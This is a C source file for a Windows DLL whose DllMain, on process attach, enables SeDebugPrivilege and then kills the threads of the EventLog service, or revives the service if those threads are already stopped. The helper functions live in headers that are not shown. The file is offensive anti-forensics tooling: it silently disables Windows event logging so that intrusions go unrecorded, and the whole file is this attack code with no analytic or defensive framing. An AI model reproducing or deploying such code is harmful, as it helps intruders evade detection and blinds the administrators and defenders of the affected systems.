#include "EventLog.h"
#include "EnablePrivilege.h"

// Call after DLL is loaded
// ------------------------------------------------------------------------

void go() {
	// Attempt to enable SeDebugPrivilege
	if (!enable_privilege(SE_DEBUG_NAME))
		return;

    // Attempt to kill EventLog Service threads
	if (kill_eventlog_threads())
		return;
	// If failed it means threads already neutralised ergo revive
	else
		revive_eventlog_service();
}

// DllMain
// ------------------------------------------------------------------------

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	HANDLE threadHandle;
	DWORD dwThread;

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		// Init Code here
		go();
		break;

	case DLL_THREAD_ATTACH:
		// Thread-specific init code here
		break;

	case DLL_THREAD_DETACH:
		// Thread-specific cleanup code here
		break;

	case DLL_PROCESS_DETACH:
		// Cleanup code here
		break;
	}

	// The return value is used for successful DLL_PROCESS_ATTACH
	return TRUE;
}